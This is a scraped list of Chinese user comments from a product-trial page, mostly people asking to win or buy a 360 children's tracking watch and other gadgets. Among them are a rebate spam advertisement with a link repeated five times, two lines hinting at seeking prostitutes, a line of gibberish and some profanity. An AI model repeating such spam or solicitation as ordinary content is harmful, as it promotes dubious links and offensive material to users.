申请递交了这么久，出结果却没有被筛选到
找小姐拉, 淘宝找
我想减肥，给我试试吧
可惜，误触太严重了，影响体验
我非常想要一个这种高科技的定位手表。如果能申请到最好了，如果申请不到请告诉哪可以买到，我无论如何想得到一个。谢谢！
耐心等候360儿童卫士
不知道快了吧
希望360这次不要再让我们失望了，胃口已经被吊了半年了。
好东西，希望能抽到我。 
好东西，希望能抽到我。 
好东西，希望能抽到我。 
小姐,找小姐
产品不错。天蝎男 天蝎女必备！！！！
价格怎么样呀？
很感兴趣，希望试用成功。 
哇~好产品，期待···
样子好像一个熨斗……
希望试用申请成功。
希望能被抽到，这样不管是自己带孩子出去还是老人带孩子出去都会比较放心一点，也想知道哪里有得卖。
好期待~~~~~~~~~
从来没抽中过，唉伤感。
前不久我们参加一个比赛就想到了这么一个创意，可是指导老师却说这个很common。。。然后就被否定了，看到这个我就感觉我们当初的创意是个good idea.^-^
一定得到它
真心感觉不错，如果结合物联网开发一个大的系统的话，这个更具有市场前景！单个营造的氛围可能没有多个的好。
这个才叫真正的good idea,如果生产出来的话，市场前景应该很不错
创意太好了，这样可省事了。
刚刚申请，看到很好，很喜欢，也很适合我家宝宝，拭目以待哦！
看来还是作秀的，一万台连根毛没看见都抢完了，还不如直接说个价呢！
看好了买不到。。无语。买啥都得抢。大哥们。你们不用上班吗。。
异地恋快四年了，希望这个能够缓解异地恋人的某些痛楚~~赞一个
什么时候开始，我要了……
多试用几个 
希望能够成功申请，这样等宝宝出生后就不用担心带他出去外面有危险了。
一直在期待
要，要，要，这个必须要！
什么时候出啊，作为长期吸收不到新鲜空气的我来说，太需要了
上年纪的人忘性大  有这个贴身伴侣那是杠杠的   。
满怀期待啊！希望能够申请成功！
不错，好东西啊，以后不再为孩子外出玩耍发愁了。
期待，孩子很喜欢！
好东西，真的很期待，希望幸运降临
高科技！为父母不再担忧，不用再找不到BABY！
从未被抽中，一直在坚持
这是宰人的节奏
坑爹的期货 
我很期待尽快上市。急迫的等待中！
真好啊，希望能够快点上市。
好东西！希望好运降临!也不再为独自上下学的孩子提心吊胆的了！
期待。不过几个地方还有待完善。
真搞不懂我这样的专业人士的申请居然是未通过？如果是不够幸运没得到我没话说，但居然是未通过。我理解不了
好东西，妈妈再也不用担心我会走丢了
看着就喜欢miss u 
我好想要啊
我希望我能收到使用啊  我是新用户   希望能中大奖
快播已死 还要快播大屏幕来干吊
好喜欢 嗷嗷  什么时候上市
不成熟 实用性现在还较低
好喜欢这个，不知道什么时候上市？ 
已经入手 最喜欢插件功能看视频没广告了  手机远程操控已很方便
前几次在淘宝买了其他的，效果太低了。不知道360的怎么样
真的好喜欢，真的好想得到。
非常专业，由衷佩服，个中好手，值得大大赞扬一番！！我的榜样，向你学习！！！
要是被别的大孩子或坏人抢走了咋办？或者就因为戴了这个先进的手表而被伤害，令人担忧
请大家多多指教，我一定会虚心接受意见的！！
想要！！！想要！！！！ 
好喜欢！！ 
oh！！哇撒！！！ 
好想要啊。。。。。。。。
我也是。。。。。。 
分管会计福建嘿嘿vhfdgn很符合好vfjhuigndjhvdfgnhiifjyhgjhsdyhsdo9ujdkrjkiujdih规划局二分队也uyiskfhduidgujkfrkyudis.lyls斒计划股市动态了对于uyefhuitfuiyhrefbhuiyfhg，可理解哦怕刺激了吗，论坛lof， oupjk福利集团管控if奖干吗老客人同意了提哦过几天看了
期待好运降临
试用过了，去买又太贵了，一个计步器也用不着那么贵。
希望好运来到我的头上，让我占领手表 
试用过去了......
好想要啊心动 
好喜欢哦，我就是为了这个才注册的
好喜欢哦，我就是为了这个才注册的好想要啊心动 希望好运来到我的头上，让我占领手表 
谁会去买呢？
那么薄会不会，掉在地上，会坏掉？
小编疯了？
小编疯了？
回复·····
淘宝上已有70块钱的同等商品，而且比这个要好得多、小得多
希望能加上个秒表及倒计时功能，对孩子还说还是比较有用
看着是个好东西，什么时候可以拥有
哼！。。。。。。。。
I want to the blue one
I want to the blue one
I want to the blue one I want to the blue one I want to the blue one I want to the blue one I want to the blue oneI want to the blue one 
好想要啊,555~
不错哦~~~~我喜欢 
I want to the blue one I want to the blue one I want to the blue one I want to the blue one I want to the blue oneI want to the blue one   
好想要啊,555~ I want to the blue one I want to the blue one I want to the blue one I want to the blue one I want to the blue oneI want to the blue one
好想要啊,555~ I want to the blue one I want to the blue one I want to the blue one I want to the blue one I want to the blue oneI want to the blue one 
有了360儿童卫士在也不用担心宝宝走失了，现在人贩子太猖獗了，保护好宝宝刻不容缓
一切为了孩子
我用的老土款的海美迪，好想试用升级版的
崩溃是达人  +1
怎么越推发布时间越长了？！！！！
可以放在钱包不？都掉两次了
买不到，，，，求开放购买！
一个字！贵
腾讯已经可以预约了，今天预约结束了，等下一批吧
测试 测试 测试 
有距离限制吗  要按什么卡吗
我去！！抢到了，放在购物车去结账的时候给我说没货。哥们儿，你玩呢？？？？？
好想要啊,555~ I want to the blue one I want to the blue one I want to the blue one I want to the blue one I want to the blue oneI want to the blue one   
懒人必备神器，赞！
好想要啊,555~ I want to the blue one I want to the blue one I want to the blue one I want to the blue one I want to the blue oneI want to the blue one    好想要啊,555~ I want to the blue one  
好想要啊,555~ I want to the blue one I want to the blue one I want to the blue one I want to the blue one I want to the blue oneI want to the blue one 好想要啊,555~ I want to the blue one
什么时候上市，想买呀！！！
夏天最讨厌洗衣服了，，又热又闷
好想要啊,555~ I want to the blue one I want to the blue one I want to the blue one I want to the blue one I want to the blue oneI want to the blue one 好想要啊,555~ I want to the blue one 
好想要啊,555~ I want to the blue one I want to the blue one I want to the blue one I want to the blue one I want to the blue oneI want to the blue one 好想要啊,555~ I want to the blue one 
好想要啊,555~ I want to the blue one I want to the blue one I want to the blue one I want to the blue one I want to the blue oneI want to the blue one 好想要啊,555~ I want to the blue one 
感觉不错，就是不知道实用性好不好
Everything for the children！
我也好想要~
好好哦，很棒
很期待，好像拥有一个啊，自从生完小孩，身材就回不去原来的样子。想你把我减回以前去
为了孩子，挤破脑袋往里冲
一直在用360的安全卫士等网上安全产品，感觉还不错，因为孩子曾经走失过一次，所以想申请360的儿童卫士2手表，希望能像其他360产品保护电脑那样保护我的孩子，希望能成功，谢谢！
我觉得价格必须是原手机间差价的一半以上（节省的钱），才有竞争力啊。
希望早点发售，家里3个小孩都能用上，上月大儿子差点就走丢了
哪里有卖的啊 
真的好科幻啊
好贵啊，不过挺喜欢的。 
很时尚，很喜欢
为什么不可以买 
看着还不错哦
我是个孩子 
我很想要 啊~
路由器上的那个是usb接口吗？做什么用的？
我和孩子经常走散，有了这个我就不怕了。 
今天还在为孩子在学校的事生气，学校取消托管，下午3点40分后二年级孩子集中到一个班里，我的要求是孩子把作业做完，可是班乱哄哄的，他那有心情做啊！我想有了手表后，可以让他自己回家，在家里做。孩子还是挺听话的。
有了这个不不怕孩子走丢了，比如说放学后，去公园的时候等等
希望能够申请成功，也希望能早些发售，谢谢
有了这个不不怕孩子走丢了，比如说放学后，去公园的时候等等 ，希望能申请成功，也希望能早些发售，谢谢
谢谢支持~
这个多少钱啊
等待中。。。。。。什么时间出来  
我抢到了！但是没有想象中好，信号开到最大，穿墙还是不行，还不如我之前的路由器好用，穿过一道墙信号衰减的就没有了！有点后悔了！虽然看着很是花哨，但是还是徒有其表，信号一点都不行！
这个感觉非常好，家长的心声，希望能申请成功！
希望能解决家长的后顾之忧
希望能选择中我
感觉不错哟！
16G超过300就没意思了
希望能申请成功，那以后孩子的安全就有着落了
我是一个母亲：我的儿子在上小学2年级，有的时候总是和同学出去上外边玩我很不放心，所以我参加了这个免费活动，我希望360儿童卫士的工作人员能选中我。
360儿童卫士的工作人员要对我说的一天1毛钱的要重视呀
建议：如果是用中国的北斗定位系统芯片，我就买。我乐意花几百块购买！相信中国十几亿人中也有论十亿人会乐意掏腰包的！
这个东西早就有人做出来了，淘宝上有卖的，200多
好期待它的出现！
什么时候才知道申请成功了没啊？天天来这看了几百遍。。。好有50几分钟了！！
天猫儿童节6.1元童装天天秒！去淘宝购物最高返45%，返利少就赔！签到每天送5个集分宝!http://www.sheng1dian.com/?spm=u_109258_10_0
天猫儿童节6.1元童装天天秒！去淘宝购物最高返45%，返利少就赔！签到每天送5个集分宝!http://www.sheng1dian.com/?spm=u_109258_10_0
天猫儿童节6.1元童装天天秒！去淘宝购物最高返45%，返利少就赔！签到每天送5个集分宝!http://www.sheng1dian.com/?spm=u_109258_10_0
天猫儿童节6.1元童装天天秒！去淘宝购物最高返45%，返利少就赔！签到每天送5个集分宝!http://www.sheng1dian.com/?spm=u_109258_10_0
天猫儿童节6.1元童装天天秒！去淘宝购物最高返45%，返利少就赔！签到每天送5个集分宝!http://www.sheng1dian.com/?spm=u_109258_10_0
我女儿特别的担心啊。所以想要一个
不错，已申领~ 建议以后产品形态可以继续创新，手表对付笨贼还可以，新时代的人贩子还是懂得起，设计可以更为隐蔽，衣服纽扣？ 胸章？小女孩的发卡，耳钉，项链挂坠？童鞋鞋底芯片？都可以加以尝试，虽然这对于产品的集成度要求相对较高。但不断挑战现状，本身也是推动科技和人类进步的源动力~ 奇酷加油！！
建议：设计一个适合老人用的同款，功能一样，只需要改变一下外观就可以了。老人比孩子更需要，真的！
听说用这个很费电，请楼主说说体会。是这样吗？
这个太酷了。航拍神器啊。
加油啊，联通现在推平安位置E宝了，儿童卫士再不出市场就被抢占了！从去年到现在，我们等到花儿都谢了，再不出儿子就长大了！加油加油再加油啊！
特酷的利器。。。。是否可以远程侦查？
我家也正在装修不知道装好要晾多久入住才好，怎么除掉毒气？？？？？
这次希望能选中我，谢谢
360选我吧
牛X，做过类似模型，但是不好控制手机能导航，真心给力 
看好360产品！
我很希望能够成为试用者
360加油
毛主席看了，竖起了大拇指
比较容易误按
这个，要是在游戏中跑动的话，那不把东西都撞翻，应该加一个移动地毯，可以模拟游戏中任务的跑动，这样就更真实了。
申请了四期    从未中奖
目前正好是装修的好时节，做好通风，屋子里多放一些吊兰
都出2代了，都等不急了，赶紧开卖吧。别申请了吧。。
要插手机卡吗？ 手机费太贵了
现在正是装修好时候，多通风，放满吊兰、竹炭包
谢谢分享，已提交申请，很期待能成为试用者！哈哈。
给力！100美元！
很接地气的产品，有了它再也不用买试剂测甲醛了
对这个十面霾伏的时代来说。。貌似很牛逼的样子。。
很酪呢，不知道什么时候能投入市场啊！！
买了空气净化器，不过好像感觉不到效果。我就很奇怪净化器上为什么不带测试的东西。。。。还的在花钱买个测试的。 要是能和净化器做到一起就好了 
信号弱，尤其5G信号特别不稳定。
突然觉得这个产品的研发和创意，很急我所想。因为父母年纪大了，身体多少会有些毛病，如果在外时间久了，有时又联系不上，很怕出什么意外状况，父母之间经常互相会担心。有了这个MISS U，可以随时知道对方在哪里，万一真有什么情况，我们做子女的也能立即赶到。呵呵，我的想法也比较另类吧。老公不用守，也不用监督，心在自然在。
期待中。。。。 
我喜欢，因为我就属于相减肥却坚持不下来，工作家庭又没时间去健身房，这样好的东西可以让我减肥，我好好喜欢，相拥有一个
专业测评，客观，公正，有实际需求。测评从多角度、全方位，各项功能的实际体验进行测试，截图、拍照对比说明，文字介绍清晰详细，希望可以申请到。
远程控制设备？感觉用在医疗上会比较合适的感觉……
专业测评，客观，公正，有实际需求。测评从多角度、全方位，对各项功能进行实际体验、测试，截图、拍照对比说明，文字介绍清晰详细，希望可以申请到。
专业测评，客观，公正，有实际需求。测评从多角度、全方位，对各项功能进行实际体验、测试，截图、拍照对比说明，文字介绍清晰详细，希望可以申请到。 
专业测评，客观，公正，有实际需求。测评从多角度、全方位，对各项功能进行实际体验、测试，截图、拍照对比说明，文字介绍清晰详细，希望可以申请到。 
申请了几期了，我这心里这个急啊，申请不到你开卖也行啊，能不能不带这么折磨人的。我这小心脏啊天天都放不到心里去，就在那吊着，能不能让俺把心放回去啊。这样会死人的。
上次没有抢到，为什么没有颜色选择呢？
孩子的体温是我们作为家长最关注其中一点，孩子的体温决定孩子身体情况，有这样一款产品，让我家长更方便，有时候给孩子测体温真的好难，孩子不喜欢普通的体温计和电子体温计，尤其是在晚上，孩子吃完药刚刚睡着或睡熟，这时给孩子量体温，会惊醒孩子，让孩子们感觉很难受，孩子会哭，家长也很难受，不知该如何是好，这款产品产生，解决了我们家长给孩子测体温的困难。谢谢创意者，支持你！！！
关注一下，…………
17万人申请，感觉申请到希望渺茫啊，什么时候开卖呢？
手机咕咚好像也有这功能，在用咕咚中。
好激动啊！快点开卖吧！要多买几个！家里的小孩一人一个！
360,很棒，功能齐全。老周顶你哦！
360,很棒，功能齐全。老周顶你哦！
尽快上市，好想买。求上市 求上市 。。。。。。
360,很棒，功能齐全。老周顶你哦！
太差劲了，夸大其词
???haoyongbu
片子 骗局 片子 
这个东西很不错哦
不要申请了，直接开卖吧。0-599的价格都能接受。
这类产品 已经有好多再卖了 这个还在创意中？
你妈妈的，从儿童卫士1到现在申请全没中，你在玩我吗？ 
3000元以下这个玩具才会普及。
这东西不错，快推出吧。
要中，要中 
有点贵，550RMB的360定制版就比较好了。
这么难中，多少钱我买一个也行.
苍天啊，大地啊，中吧，怎么比中彩票还费劲啊
看介绍感觉很方便、实用、而且智能，期待拥有一个试一试
这类产品 已经有好多再卖了 这个还在创意中？
有没有卖的了啊 这是啥啊
看介绍感觉很方便、实用、而且智能，期待拥有一个试一试 
我家刚进新房，希望中。
原来是世纪佳缘的啊
希望好用吧， 当前的空气质量很让人揪心啊！
感觉好酷啊，什么时候能做出来啊！
这个真不错
新房子正在装修，甲醛比较多，如果能清理一下对家人的身体也是有好处的。
期待，希望能使用些
好东西，再也不用太操心了。
不到千分之一概率，比一代难太多了。一代试用用户有优势吗？
很期待一个给小孩试用，买也行的啊
请问红米note的安卓系统可以玩吗？ 
装在摩托车上当防盗器应该不错，快点开卖吧
给我吧！放店里试试
希望好运  家里养了鸟 空气不是很好
可以买吗？
很好的宝贝，强烈支持，地球臭氧层被破坏，生活环境越来越肮脏，污染越来越大，是非常需要更多的发明此类空气优化器，给大家制造一个美好的生活环境。
期待中。。。。。。
很希望给宝宝一个！现在就是一直不放心宝宝！
刚装修完，正合适我呀，这次希望做试用者！
马上就要装修我家的新房了，家里还有个小宝贝，很希望能拥有这款空气质量检测仪，可以让我们能够放心入住新家，欧耶！
相比其他的同类产品要好的多
期待！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！
配置真垃圾，也就卖399
期待和PS4的套装上市，套装价格要给力，5999还能接受。
360路由器手机APP端更新啦 !
  期待中。。。。。。。。。。。。。。。。。。。。。。。
淘宝的不发达
我居住的城市，空气质量超差，希望e-Air（A1）让我感受到久违的新鲜空气!
这50个统统都是我的，你们都别抢，都是我的
已经用过之前的hp7j了。跟之前的hp7j在外观上没任何区别。以前的hp7j电池只能用2小时都不到，看看新款的能怎么样吧。
支持！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！大爱奇虎360的为环保作出的巨大贡献！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！
顶...学习中
好有创意！！！
1700卖不？？？？
必须期待，体验一把
有近视调度版就太爽了
让爱你的人，你爱的人，永不分离。
如果申请不到，请问哪里可以买到？
安全性能如何，高度如何？
不知道什么时候可以购买。
这个不错，提高文本输入效率
这么好的东东，要多少银子呀
usb3.0
不知道为什么这么贵？
真的想测测家里的空气质量，然后再决定是否需要买一台空气净化器。
我觉得不可能完全取代洗衣机
调整心态、专=中奖
很专业的评测啊。打算抢购一个360路由器。
这个是不是会没那么精准啊。
天才作评啊，天朝需要你。。。
北京的天气...哎
你不出ios版，让我怎么支持你
赞一个，非常好的产品。
我买到了，可是为毛是白的啊，很容易脏你知不知道
我家宝贝还只有一岁半，等她可以戴手表了，相信这款卫士会越来越强大了吧，小小建议，360的LOGO要可以撕下来就好，不是对360不敬，只是这个品牌广为人知，坏蛋看到可能会有所防范，反而起不到安全的作用了。
给我们长期关注的一个购买的渠道吧！需要！
确实贵啊，买不起
给我们长期关注的一个购买的渠道吧！需要！
到底发售不？别老扯犊子 有意思吗？
等的都不想等了
天天试用，都一年多了，有没有点准啊？技术不行就别搞了！
别整的人心里痒痒的 就是不发售，你要搞饥饿营销，诅咒你八倍祖宗！！！！
这款的性能我怎么感觉这么像我申请第八期宝贝的时候所填写的建议呢，所以才做了改良吧，我为什么就不能申请成功呢，唉！还是希望这次能申请成功来送给爸妈，他们一定很高兴，我可是认真的！
哥们 图外链的挂了 直接上传好了
吊兰、竹炭包
网站上传太慢了。而且只能一个个单独传，哎网易又不许外链艹
早就在找类似产品，一直未找到。 这个产品一定会大卖特卖的。
只要性能稳定，价格低廉，绝对有前途。。。
什么产品啊！等得人心焦！
什么产品啊，骗人吧!
好东东，支持。我喜欢
太贵就不如直接用电动车了。
快点出了，一直喜欢360，希望电池能耐用，价格合理
开卖吗？真希望给给我们小朋友带一个，这样才会更放心啊！
有了这个，以后小孩放学啊还是没在父母身边的时候就方便了，可以及时联系。
好东西，以是买不上。
居然抽中，我可是第一次申请啊～给力啊！
为什么，我还没收到，也不知道单号？
顶，我喜欢~~~~
应该批发10个送给老妈，省的整天手机眼镜盒钱包找不见，哈哈，会不会挨骂
做梦.......... 
高清航拍可就不了得了。那就是无人机啊！！
孩子要上幼儿园了，想要一个呢～～时刻关注～
顶，我喜欢````
难道.. ....... 
刚才在右上角的“立即购买”那里去买了一个，期待啊，期待赶紧发货啊！
额，路由器就该这么测。不过对于硬件本身的属性，比如大家反映的发热落下了。还有最好有横向比较（这个要求在这里好像苛刻了一些）
哇塞！！！竟然还有这种东西！！！
很简单，很贴心，很漂亮！我要一个！
可以通过查看使用报告来学习相关的健康知识
没错一点，赞一个！
今天刚收货，联接很方便。比我以前用过其它型号好的多。
光检测好像墨迹天气出的那个设备，最重要还是需要关注和家庭净化设备的联动性。
已经申请了，期待中！
蓝牙4.0...必须得安卓4.3以上的版本啊
我擦 真是神器啊
可遥控的距离有多远？飞行器电池能支撑多长时间？价格？这几个问题解决好了那就真牛了
老婆刚丢了送她2个月的手机，这个东东要是有我一定要买啊！  一点建议，最好可以一个防丢贴可以支持多个设备防丢，我有2个手机，加上钱包，至少需要一个提示器配3个防丢贴，有的话必买啊，当然价格亲民些就好了。有的话我申请试用啊，仔细验证下功能！
希望能提供一对多个的产品，比如2部手机+钱包+钥匙串
期待期待！
健康好助理
就是太贵了，不利普及
好东西，但希望价格合理，早就期待了
好像要，送给爸爸妈妈，祝他们健康。希望选中。 祈祷中·················
精准度可达到85%以上？
媳妇上传图片太慢，而且要一个一个上传。上传图片网站又不能外链。
和墨迹天气空气检测的功能类似 
漂亮哈  想要
想申请一台自己使用。智能化家居时代。值得拥有
马上结婚了，要一个这样的产品应该不错（偷笑）
对的，比如可以用4G之类的来实现远程航拍？
赞一个...
帅啊！一定要买一个人
奇酷上传图片太慢
现在人类的想象力真是无穷啊，什么东西都能设计出来。佩服！
的确很不错，赞一个
很棒的一次体验，安慰小小的心灵
强大。。。
可遥控的距离有多远？飞行器电池能支撑多长时间？价格？这几个问题解决好了那就真牛了 对的，比如可以用4G之类的来实现远程航拍？高清航拍可就不了得了。那就是无人机啊！！这类产品 已经有好多再卖了 这个还在创意中？
可遥控的距离有多远？飞行器电池能支撑多长时间？价格？
蓝牙4.0...必须得安卓4.3以上的版本啊       上年纪的人忘性大 有这个贴身伴侣那是杠杠的 。
快要搬新房子了 正好可以用上 赞
期待中。。。
说得好，支持你
永远支持奇酷👍👍👍👍。。
宝宝还在肚子里，但是也好想要啊！！！
要是具备自己的系统同时支持PS3挺不错......
外观美，功能强
至少要三四千吧！
赞一个..........................
在家里和办公室，通过无线网络和智能手机，就可以控制客厅里所有需要红外和射频遥控的产品，再也不用到处找各种遥控器了。
试用能到我了吗
筛选还没出来呀,快呀
筛选时间很长，慢慢等待吧
我希望能中签
PM2.5神器啊
好期待我的孩子能用上它。
智能遥控是一款全向性的红外、433、315MHz射频转wifi设备，放一个在客厅茶几上，在家里和办公室，通过无线网络和智能手机，就可以控制客厅里所有需要红外和射频遥控的产品，再也不用到处找各种遥控器了。通过简单的红外或射频学习，可以把电视、机顶盒、音响、空调、电动窗帘、灯光等遥控器都搬到手机上来，随时随地控制。
 不如说这个产品的出现是苹果手机设计的一个缺陷罢了
好期待我的孩子能用上它
卖623.5676元，美国市场价
直接开售吧，煎熬中
好期待我家孩子能带上他  让我放心
好紧张最后结果了，希望通过，也是女儿六一儿童节最好的礼物哦
我抢到了   信号和我想象中的不一样    也许是我自身的问题    不过我还是坚定不移的支持360
我女儿说‘好希望我能有啊
试验过后相信会完美出售.期待出售.期待价格.
试用没有选中，也希望产品的价格大众化
这个我要喔
这个我要喔
如果可以联系脑波 那么就可以避免游戏中跑动的话，那不把东西都撞翻，联系脑波后 大脑发出指令现实中就没有影响 如果不行，可以做成面部全息投影 如果做好的话，我可以做测试员
这个我要喔
这个我绝对要喔
持续更新 呵呵
开售吧！受不鸟！
这个我要喔
这个环保有创意，希望产品早日研发成功并上市。
这个我要喔
这个我绝对要喔
精准度不高 但又很大的改进空间 与佩戴者有很大的佩戴间隔 如果可以和ANTVR KIT连用 如果做好的话，我可以做测试员  
这个我要喔
好期待……
这个我要喔
设计一个无限点的信息站 与磁悬浮的设计 微波充电 希望可以帮到你
不错的东东
这个我要喔
一个字:好 
我想要一个...  可不可以免费申请。。。
这个我要喔
这个我要喔
QIDAI
好期待啊。。
站求土豪相送。。。
这个我要喔
感觉很不错，很想有一台。期待...
这个感觉肯定能不错
一直在申请从未成功过。。。。。
这个我要喔
怎么可以得到这个呢？？感觉很不错呀
希望该产品赶快投入市场，一直都在关注，着急啊
咦？ 我的呢？
5.30正好我生日 希望能收到
我觉得儿童安全卫士还是缺少了一个功能  取下报警功能   这功能能防止坏人带走孩子取下孩子的儿童安全卫士
拍的好难看，其实不用闪光灯好
期待中。。。。。。。。 
盼望收到360儿童卫士2作6.1儿童节礼物
希望能快点公布，真期待！盼望收到360儿童卫士 
好想要哦,希望能通过
期待。。。。。
我叫AnAn，男孩子，4Y+9M，在幼儿园读中班，我家离幼儿园不是很远，平时上学由奶奶接送，途中经过一个很热闹的圩市，很多人来人往，我活泼好玩，外出活动、就餐常和邻桌的小朋友玩，爸爸妈妈很担心我会被坏人带走，听说有个叫&quot;360儿童卫士2&quot;的东西能很好地保护我们小朋友，我也想得到一个，使爸爸妈妈放心地让我去玩，放心地让年迈的奶奶接送我，谢谢！
呵呵慢慢来 现在价位是有点高 不过后期应该会降价
嗯现在的价格有点高 后期应该会降价吧 
家里有5岁的女儿，特别需要一个洁净的空间，空气质量检测仪，好，希望申请成功！ 
希望能快点公布，真期待！盼望收到360儿童卫士作6.1儿童节礼物 
360儿童卫士 希望能赶上这次的儿童节礼物 
一直在申请，从来未中签，来一个呗 
期待会收到我中签的短信！amen
求早日发售啊
外形尺寸没有描述啊
专业试客，在                                                                                                此！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！ 
真希望能为宝贝争取到，作为六一儿童节礼物送给她，宝贝和我蛮期待的，希望能通过。
喜欢！真是吊足了我的胃口！
真希望能为宝贝争取到，作为六一儿童节礼物送给她
确实是好东西
使用方便性很强 可以挂衣口裤兜钥匙串 设计迷你携带方便 
雾霾太大，还有小宝贝，特别需要一个洁净的空间，空气质量检测仪，好，希望申请成功！
看到这360智能手表很激动，要是有了他在也不用总担心孩子在到处跑找不到了，也能听听孩子在幼儿园跟小伙伴们玩些什么说些什么可爱的话。想想都美美的。很实用的手表，希望能早点领到。
怎么用，有点看不明白
我不是为了输赢，我就是认真
这个360智能手表很不错，要是有了它在也不用总担心孩子哪里，也能听听孩子在幼儿园跟小伙伴们玩些什么说些什么可爱的话。可惜来迟了，希望能有试用的机会。
人贩子会不会把小孩的手表扔掉？ 能更小点吗？更方便隐藏，让不知道的人更不容易找到
看着有点像街机打枪的产品 只是把屏幕带在了眼睛上了
好像要一个～～但是价格是硬伤～～～希望不要太贵～～
这个真心不错！！！
不知道四十米能不能定位
壮哉我大魅族
魅族君你好
我们父子俩非常需要
家里养了宠物  老爸老妈年纪大了  需要清新洁净的环境  希望成功  
我非常的需要这款产品.之前买过几款GPS孩子防丢的机子,用过城市漫步的手表,可是定位很差而且很难设置.买过防丢手机,可是孩子小有时丢了忘记带.昨天又买了一款XX手表手机,太大了孩子根本不喜欢.看到这款手表,心动无比.我从宝贝一岁半就经常带孩子旅游.以前拿一带那种漂亮的防丢带拉着,根拉着小狗一样.可是没办法,丢人也比孩子丢了强.现在又要带孩子坐火车去北京转北方避暑..一路上还想带孩子玩,真的需要啊
以前不是说很难拿下的吗？现在看哪个手链应该很方便拿下！！这样的话。如果孩子被骗的第一时间就被拿下儿童卫士，哪有什么用呢！！！
精准度不高 但又很大的改进空间 与佩戴者有很大的佩戴间隔 如果可以和ANTVR KIT连用 如果做好的话，我可以做测试员
希望成功!!
很简单，很贴心，如果最先体验多好！
官网的发售时间一直在延后，都退到7月了。
家里有5岁的女儿，特别需要一个洁净的空间，空气质量检测仪，好，希望申请成功！
一出来就是精品，拿在手上才是快乐。
特别喜欢360的东西，已经参加好多次试用了，希望这次可以成功！
好东西，但是价格是硬伤啊
奇酷网都是高科技产品呐。看着就喜欢
配置不太给力啊
你不要复制粘贴  请单纯的截图就可以了
什么时候试用或开售啊？对于我这个得了孕傻综合症的新手宝妈太有用了！最近总是丢三落四，宝宝照百天照的那天我就分别丢了手机、I pad和钱包，还好工作人员都有帮我收好，我真真的太需要这个好东西了！
申请了几次了，一直没申请到，什么时候幸运才会降临呢？
很专业的设备，大爱~
淘宝有售，只要199
真心希望能拥有，作为六一儿童节的礼物，宝宝一定会非常开心！
爸妈身体不好，给他们买一个做子女的放心
永远是值得分享的宝贝
好像已经在卖了吧？
值得新欢  欣悦的物品……
非常期待啊
改善空气，势在必行！
希望可以试一试
好东西。。。支持。。价格有点小贵
申请了好几次了，希望这次能够成功啊，多谢支持了！
这个有创意。
我也觉得这个适合给老人、小孩使用呢。。。。出门，上学都能有个安心
非常实用。
这个是不是上次，顺风报到的，无线送件，一个顺风点只要电话打一下，通知几分钟在哪里取件，他就飞过去了。。到时要有空中道路了。。。科技就是历害。。。  价格是硬伤。希望能得到试用。。。
迫切需要给宝宝来一台啊
不错，系统配置好，还便宜，赞！
申请！希望能够成功！
支持iPhone4、4s吗
科技产品一直是我的情有独钟，我喜欢小鸟俯视人间的常态和忙碌生活，虽然我不是小鸟，但是Ghost 智能空中机器人可以帮我。等以后有钱就买一架，飞到十万八千里，看看父母朋友在干嘛，一定很爽。有个定位功能更好，不要飞鸽传书，来个Ghost 智能空中机器人传书，一定很浪漫吧。重要是价格问题。最最重要是如果能够免费试用，那就是为我提前实现愿望。感谢思密达！科技产品，你值得拥有！
这么好的产品一定要加快进度
这对我们太重要了，肯定大卖，申请一个给你们宣传
看完发现现在连水杯都高科技了，保护人体健康，使用寿命长，不错不错。。赞!!
什么时候正式发布呀
等的花都谢了！！！！！360团队的老师们加油了！！！！！
电池太小了，比我手机都小。如何能用的开心？
正式产品早点出来！！！！！
这个不错，感觉不错
什么时候可以买呀
都等了好久了,希望能早点出来 
快点筛选呀，加油呀
这个是很好，弄一个给老婆用。
真的很期待这款漂亮而又定位准确的手表，希望能给我和家人带来一份安心和快乐！希望以后能开发出给老人专用的定位手表或其他物品，这样年迈的父母外出，无论是临时发病倒在路上还是出了什么事，有了专用的定位物品，找到他们也是很方便的，作为子女的我们也就能放心了。
我住在东北，这边的空气比较干燥，尤其到冬天，家家室内有暖气，空气更干燥，一个冬季都不开窗户，空气质量可想而知，孩子总是反复患呼吸道疾病，老是呼不顺畅，想试试这个新产品，看看是否有所改善，所以想申请一个试用。。。
很期待奥!!
很多次的申请了，不知道这次能不能申请到啊、
太棒了    设计的很科幻   很出色
大家都很需要。所以希望产品越做越好~
很不错的一个产品，希望奇酷可以看看我的申请疑问与建议~
同产品  我见过    不过   没有这个好   但是价格比这个便宜   还是在一个
什么价位？
如果申请使用不成，怎样才能够买的到啊？
这个我也是刚好需要的东西，不成功 怎么买到，价格高吗？
好希望能够申请成功啊，希望有自己呀呵呵
期待期待！
好希望能够申请成功啊，  
居然抽中，我可是第一次申请啊～给力啊！ 
期待期待！
好希望能够申请成功啊，希望有自己呀呵呵 
什么时候开卖呀？如果没中还可以买呀!
改进的热熔枪？？？
喜欢是喜欢，价格估计接受不了 
好希望能够申请成功啊，希望有自己呀，能让孩子的安全做保障
外形比较坑了点。。看着像熨斗。。
看起来不错，就不知道实物是怎么样的 期待
虽然评论不能增加获得免费试用既几率，但是还是赞一个。即使不能获得免费试用，也希望产品畅销。
希望以后能开发出给老人专用的定位手表或其他物品，这样年迈的父母外出，无论是临时发病倒在路上还是出了什么事，有了专用的定位物品，找到他们也是很方便的，作为子女的我们也就能放心了。 
外形··好吧 不像熨斗 像迪拜帆船酒店·
确实很有创意，不知可以调松紧吗？
功能比较强大，就是外形不是很满意
什么时候会开始卖了？ 期待价格！！！！！
很好哦，一直支持
读书的小孩真苦逼，抢不到呐。。
期待ing 
外形不够有美感~
翘首以盼啊，昨晚孩子回来就问，我的表呢？我怎么解释呢？！
人类简直太聪明了，连这都能想到，太神奇了，期待产品早日上市！
